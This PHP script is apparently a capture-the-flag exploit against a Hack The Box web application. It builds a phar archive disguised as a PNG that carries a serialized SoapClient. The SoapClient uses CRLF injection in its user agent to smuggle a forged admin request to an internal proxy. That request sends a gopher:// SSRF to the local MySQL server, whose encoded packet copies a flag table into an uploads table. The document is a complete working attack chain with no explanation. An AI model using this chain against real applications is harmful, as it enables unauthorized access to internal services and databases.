<?php
class ImageModel
{
	public $file;
	public function __construct($file)
	{
		$this->file = new SoapClient(null, array(
			"location" => "http://localhost:80/proxy",
			"uri" => "http://localhost:80/proxy",
			"user_agent" => "clrf-inject\r\n\r\n\r\n\r\n".
				"POST /proxy HTTP/1.1\r\n".
				"HOST: admin.imagtok.htb\r\n".
				"Connection: close\r\n".
				"Cookie: PHPSESSID=eyJmaWxlcyI6W10sInVzZXJuYW1lIjoiYWRtaW4ifQ%3D%3D.JDJ5JDEwJDdvOU9CS2FTa3FDcFAzelFKZnhrUGVQRDNPLzVFTWRvdmhGVHhPMXNGUGVpcFkwOFBMc0RX\r\n".
				"Content-Type: application/x-www-form-urlencoded\r\n".
				"Content-Length: 2739\r\n\r\n".
				"url=gopher:///127.0.0.1:3306/_%25%61%39%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%37%35%25%37%33%25%36%35%25%37%32%25%35%66%25%35%38%25%34%66%25%33%35%25%34%38%25%34%38%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%37%25%33%32%25%33%35%25%33%35%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%32%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%37%37%25%30%30%25%30%30%25%30%30%25%30%33%25%34%39%25%34%65%25%35%33%25%34%35%25%35%32%25%35%34%25%32%30%25%34%39%25%34%65%25%35%34%25%34%66%25%32%30%25%36%34%25%36%32%25%35%66%25%36%63%25%33%31%25%36%62%25%36%38%25%37%37%25%32%65%25%36%36%25%36%39%25%36%63%25%36%35%25%37%33%25%32%38%25%36%36%25%36%39%25%36%63%25%36%35%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%32%63%25%32%30%25%36%33%25%36%38%25%36%35%25%36%33%25%36%62%25%37%33%25%37%35%25%36%64%25%32%63%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%32%39%25%32%30%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%36%36%25%36%63%25%36%31%25%36%37%25%32%63%25%32%32%25%33%31%25%32%32%25%32%63%25%32%32%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%32%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%36%34%25%36%32%25%35%66%25%36%63%25%33%31%25%36%62%25%36%38%25%37%37%25%32%65%25%36%34%25%36%35%25%36%36%25%36%39%25%36%65%25%36%39%25%37%34%25%36%35%25%36%63%25%37%39%25%35%66%25%36%65%25%36%66%25%37%34%25%35%66%25%36%31%25%35%66%25%36%36%25%36%63%25%36%31%25%36%37%25%33%62%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31".
				"\r\n\r\n\r\n"
		));
	}
}
@unlink('payload.phar');
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFile('test.png', 'test.png');
$phar->setStub(file_get_contents('test.png') . ' __HALT_COMPILER(); ?>');
$phar->setMetadata(new ImageModel('none'));
$phar->stopBuffering();
system('mv payload.phar payload.png');